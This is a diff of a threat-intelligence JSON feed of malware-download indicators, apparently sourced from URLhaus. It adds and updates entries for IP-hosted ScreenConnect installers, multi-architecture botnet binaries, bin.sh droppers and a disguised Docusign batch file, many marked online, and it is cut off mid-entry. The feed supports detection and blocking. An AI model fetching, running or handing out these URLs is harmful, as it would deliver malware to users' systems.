@@ -1,5 +1,5 @@
 {
-  "last_updated_utc": "2026-08-19T13:44:21.322489+00:00",
+  "last_updated_utc": "2026-08-19T14:34:54.789124+00:00",
   "structured_iocs": [
     {
       "value": "162.243.103.246",
@@ -72,9 +72,369 @@
       "country": "JP"
     },
     {
+      "value": "https://217.217.97.172/Bin/ScreenConnect.ClientSetup.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:24:09",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905814/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:24:09",
+      "status": "online"
+    },
+    {
+      "value": "https://217.217.97.172/bin/support.client.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:24:09",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905815/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:24:09",
+      "status": "online"
+    },
+    {
+      "value": "http://60.17.83.99:51270/i",
+      "type": "url",
+      "threat": "2026-08-19 14:21:32",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905813/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:21:32",
+      "status": "online"
+    },
+    {
+      "value": "https://195.177.94.64/bin/support.client.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:21:11",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905811/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:21:11",
+      "status": "online"
+    },
+    {
+      "value": "https://195.177.94.64/Bin/ScreenConnect.ClientSetup.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:21:11",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905812/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:21:11",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.arm6",
+      "type": "url",
+      "threat": "2026-08-19 14:20:21",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905810/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:20:21",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.m68k",
+      "type": "url",
+      "threat": "2026-08-19 14:19:25",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905808/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:25",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.spc",
+      "type": "url",
+      "threat": "2026-08-19 14:19:25",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905809/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:25",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.sh4",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905799/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz.sh",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905800/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.arm",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905801/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.arc",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905802/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.arm7",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905803/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.arm5",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905804/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.mips",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905805/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.x86",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905806/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.x86_64",
+      "type": "url",
+      "threat": "2026-08-19 14:19:24",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905807/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:24",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/debug",
+      "type": "url",
+      "threat": "2026-08-19 14:19:23",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905795/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:23",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.mpsl",
+      "type": "url",
+      "threat": "2026-08-19 14:19:23",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905796/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:23",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.i686",
+      "type": "url",
+      "threat": "2026-08-19 14:19:23",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905797/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:23",
+      "status": "online"
+    },
+    {
+      "value": "http://176.65.139.133/nz/nz.ppc",
+      "type": "url",
+      "threat": "2026-08-19 14:19:23",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905798/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:19:23",
+      "status": "online"
+    },
+    {
+      "value": "http://178.16.52.133/Bin/ScreenConnect.ClientSetup.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:17:13",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905794/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:17:13",
+      "status": "online"
+    },
+    {
+      "value": "http://178.16.52.133/bin/support.client.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:17:08",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905793/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:17:08",
+      "status": "online"
+    },
+    {
+      "value": "https://193.26.115.227/Bin/ScreenConnect.ClientSetup.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:15:12",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905792/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:15:12",
+      "status": "online"
+    },
+    {
+      "value": "https://193.26.115.227/bin/support.client.exe",
+      "type": "url",
+      "threat": "2026-08-19 14:15:09",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905791/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:15:09",
+      "status": "online"
+    },
+    {
+      "value": "http://219.155.12.214:51034/bin.sh",
+      "type": "url",
+      "threat": "2026-08-19 14:11:06",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905790/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:11:06",
+      "status": "online"
+    },
+    {
+      "value": "http://79.106.74.167:44091/bin.sh",
+      "type": "url",
+      "threat": "2026-08-19 14:09:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905789/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 14:09:29",
+      "status": "online"
+    },
+    {
+      "value": "http://60.17.83.99:51270/bin.sh",
+      "type": "url",
+      "threat": "2026-08-19 13:55:28",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905788/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 13:55:28",
+      "status": "online"
+    },
+    {
+      "value": "http://116.55.72.18:38032/i",
+      "type": "url",
+      "threat": "2026-08-19 13:51:27",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905787/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 13:51:27",
+      "status": "online"
+    },
+    {
+      "value": "http://42.232.236.105:33973/bin.sh",
+      "type": "url",
+      "threat": "2026-08-19 13:47:08",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3905786/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-19 13:47:08",
+      "status": "online"
+    },
+    {
       "value": "http://182.121.171.163:58015/i",
       "type": "url",
-      "threat": "2026-08-19 13:33:23",
+      "threat": "2026-08-19 14:21:45",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905785/",
       "tags": [
@@ -122,7 +482,7 @@
     {
       "value": "https://centrodolce.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest",
       "type": "url",
-      "threat": "2026-08-19 12:59:11",
+      "threat": "2026-08-19 14:01:30",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905781/",
       "tags": [
@@ -134,7 +494,7 @@
     {
       "value": "https://mkconstructions.net/ofiltytuerutyueiioo/Docusign-8901123adobe-reader07zuillnirusi.bat",
       "type": "url",
-      "threat": "2026-08-19 12:59:07",
+      "threat": "2026-08-19 14:16:54",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905780/",
       "tags": [
@@ -146,7 +506,7 @@
     {
       "value": "http://175.148.157.224:54842/i",
       "type": "url",
-      "threat": "2026-08-19 12:37:21",
+      "threat": "2026-08-19 13:50:08",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905779/",
       "tags": [
@@ -170,7 +530,7 @@
     {
       "value": "http://175.107.209.203:44599/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 12:31:08",
+      "threat": "2026-08-19 14:16:33",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905778/",
       "tags": [
@@ -182,7 +542,7 @@
     {
       "value": "http://115.48.143.40:35243/i",
       "type": "url",
-      "threat": "2026-08-19 12:24:11",
+      "threat": "2026-08-19 14:19:11",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905776/",
       "tags": [
@@ -201,7 +561,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 12:08:21",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://125.42.27.234:57981/bin.sh",
@@ -225,7 +585,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 12:02:17",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://115.56.174.13:45439/i",
@@ -266,7 +626,7 @@
     {
       "value": "http://125.112.59.94:60395/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 11:42:07",
+      "threat": "2026-08-19 13:47:40",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905769/",
       "tags": [
@@ -290,7 +650,7 @@
     {
       "value": "http://91.92.242.236/files-129312398/files/file_b8afcc5c4d1ea78e.exe",
       "type": "url",
-      "threat": "2026-08-19 11:32:18",
+      "threat": "2026-08-19 14:15:42",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905767/",
       "tags": [
@@ -309,7 +669,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 11:32:07",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://221.15.11.240:40642/i",
@@ -374,7 +734,7 @@
     {
       "value": "http://123.7.241.28:50935/i",
       "type": "url",
-      "threat": "2026-08-19 11:09:15",
+      "threat": "2026-08-19 14:11:24",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905760/",
       "tags": [
@@ -530,7 +890,7 @@
     {
       "value": "http://66.8.135.142:41648/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 10:25:19",
+      "threat": "2026-08-19 13:59:30",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905748/",
       "tags": [
@@ -554,7 +914,7 @@
     {
       "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.arm",
       "type": "url",
-      "threat": "2026-08-19 10:02:06",
+      "threat": "2026-08-19 13:54:11",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905746/",
       "tags": [
@@ -578,14 +938,14 @@
     {
       "value": "http://123.190.17.0:42140/i",
       "type": "url",
-      "threat": "",
+      "threat": "2026-08-19 14:13:35",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905744/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:40",
-      "status": "offline"
+      "status": "online"
     },
     {
       "value": "http://123.5.153.225:57640/bin.sh",
@@ -614,7 +974,7 @@
     {
       "value": "http://60.17.34.84:34056/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:34",
+      "threat": "2026-08-19 14:11:24",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905740/",
       "tags": [
@@ -633,7 +993,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:34",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://182.126.242.40:51278/i",
@@ -669,7 +1029,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:33",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://120.71.0.131:9935/linux",
@@ -693,7 +1053,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:32",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://202.163.107.242:56229/i",
@@ -722,7 +1082,7 @@
     {
       "value": "http://115.50.68.3:50876/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 10:01:32",
+      "threat": "2026-08-19 14:09:10",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905721/",
       "tags": [
@@ -746,7 +1106,7 @@
     {
       "value": "http://115.55.59.69:53574/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:32",
+      "threat": "2026-08-19 14:01:43",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905723/",
       "tags": [
@@ -770,7 +1130,7 @@
     {
       "value": "http://125.43.38.255:44908/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:32",
+      "threat": "2026-08-19 13:52:55",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905725/",
       "tags": [
@@ -782,7 +1142,7 @@
     {
       "value": "http://39.79.195.66:54804/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:32",
+      "threat": "2026-08-19 14:11:29",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905726/",
       "tags": [
@@ -794,7 +1154,7 @@
     {
       "value": "http://115.60.200.162:56430/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 10:01:32",
+      "threat": "2026-08-19 14:24:28",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905727/",
       "tags": [
@@ -830,7 +1190,7 @@
     {
       "value": "http://182.113.33.72:34879/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 10:01:32",
+      "threat": "2026-08-19 13:57:07",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905730/",
       "tags": [
@@ -854,7 +1214,7 @@
     {
       "value": "http://31.77.227.134/bins/pm68k",
       "type": "url",
-      "threat": "2026-08-19 10:01:32",
+      "threat": "2026-08-19 13:56:38",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905732/",
       "tags": [
@@ -921,7 +1281,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:31",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://125.43.106.217:44114/i",
@@ -1041,12 +1401,12 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:29",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.arm6",
       "type": "url",
-      "threat": "2026-08-19 10:01:29",
+      "threat": "2026-08-19 14:11:46",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905704/",
       "tags": [
@@ -1058,7 +1418,7 @@
     {
       "value": "http://31.77.227.134/bins/psh4",
       "type": "url",
-      "threat": "2026-08-19 10:01:29",
+      "threat": "2026-08-19 14:18:29",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905705/",
       "tags": [
@@ -1082,7 +1442,7 @@
     {
       "value": "http://60.18.84.125:39736/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:24",
+      "threat": "2026-08-19 14:16:58",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905700/",
       "tags": [
@@ -1106,7 +1466,7 @@
     {
       "value": "http://42.237.83.89:55341/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:23",
+      "threat": "2026-08-19 14:11:47",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905686/",
       "tags": [
@@ -1118,7 +1478,7 @@
     {
       "value": "http://31.77.227.134/bins/pppc",
       "type": "url",
-      "threat": "2026-08-19 10:01:23",
+      "threat": "2026-08-19 14:08:39",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905687/",
       "tags": [
@@ -1166,7 +1526,7 @@
     {
       "value": "http://27.7.157.56:57185/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:23",
+      "threat": "2026-08-19 14:17:18",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905691/",
       "tags": [
@@ -1190,7 +1550,7 @@
     {
       "value": "http://42.54.8.116:37031/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 10:01:23",
+      "threat": "2026-08-19 14:24:32",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905693/",
       "tags": [
@@ -1226,7 +1586,7 @@
     {
       "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.x86_64",
       "type": "url",
-      "threat": "2026-08-19 10:01:23",
+      "threat": "2026-08-19 14:01:25",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905696/",
       "tags": [
@@ -1238,7 +1598,7 @@
     {
       "value": "http://39.40.180.63:47173/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:23",
+      "threat": "2026-08-19 13:49:00",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905697/",
       "tags": [
@@ -1322,7 +1682,7 @@
     {
       "value": "http://115.50.68.3:50876/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:22",
+      "threat": "2026-08-19 14:05:59",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905679/",
       "tags": [
@@ -1358,7 +1718,7 @@
     {
       "value": "http://110.136.40.34:41510/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:22",
+      "threat": "2026-08-19 14:11:48",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905682/",
       "tags": [
@@ -1370,7 +1730,7 @@
     {
       "value": "http://125.41.109.138:53378/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:22",
+      "threat": "2026-08-19 13:49:58",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905683/",
       "tags": [
@@ -1406,7 +1766,7 @@
     {
       "value": "http://182.245.28.97:40240/i",
       "type": "url",
-      "threat": "2026-08-19 10:01:21",
+      "threat": "2026-08-19 13:48:22",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905669/",
       "tags": [
@@ -1418,7 +1778,7 @@
     {
       "value": "http://222.139.229.134:40628/bin.sh",
       "type": "url",
-      "threat": "2026-08-19 10:01:21",
+      "threat": "2026-08-19 13:59:28",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905670/",
       "tags": [
@@ -1461,7 +1821,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:21",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://37.78.12.145:45921/bin.sh",
@@ -1473,24 +1833,24 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:21",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://72.29.46.195:43633/i",
       "type": "url",
-      "threat": "",
+      "threat": "2026-08-19 13:52:16",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905668/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:20",
-      "status": "offline"
+      "status": "online"
     },
     {
       "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.sh4",
       "type": "url",
-      "threat": "2026-08-19 10:01:19",
+      "threat": "2026-08-19 14:22:44",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3905667/",
       "tags": [
@@ -1509,366 +1869,6 @@
         "malware_download"
       ],
       "first_seen": "2026-08-19 10:01:16",
-      "status": "online"
-    },
-    {
-      "value": "http://61.53.141.218:40057/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:16",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905662/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:16",
-      "status": "online"
-    },
-    {
-      "value": "http://182.121.246.143:47843/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:16",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905663/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:16",
-      "status": "online"
-    },
-    {
-      "value": "http://42.232.236.105:33973/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:16",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905664/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:16",
-      "status": "online"
-    },
-    {
-      "value": "http://115.55.59.69:53574/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:16",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905665/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:16",
-      "status": "online"
-    },
-    {
-      "value": "http://119.178.149.31:33483/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:16",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905666/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:16",
-      "status": "online"
-    },
-    {
-      "value": "http://111.61.92.78:58321/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905643/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.mips",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905644/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.m68k",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905645/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://221.15.12.6:38860/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905646/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.spc",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905647/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://39.79.195.66:54804/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905648/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://132.243.200.43/nullnet_bin_dir/nullnet_load.ppc",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905649/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://115.60.200.162:56430/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905650/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://31.77.227.134/bins/pspc",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905651/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://132.243.200.43/nullnet_bash.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905652/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://122.139.14.243:51081/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905653/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://79.135.225.50:13477/.i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905654/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://182.245.28.97:40240/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905655/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://37.78.12.145:45921/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905656/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://60.23.194.206:50377/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905657/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://42.232.181.83:55625/i",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905658/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://42.239.159.117:41888/bin.sh",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3905659/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-19 10:01:15",
-      "status": "online"
-    },
-    {
-      "value": "http://194.59.31.160:24414/s/linux",
-      "type": "url",
-      "threat": "2026-08-19 10:01:15",
-      "source": "URLhaus",
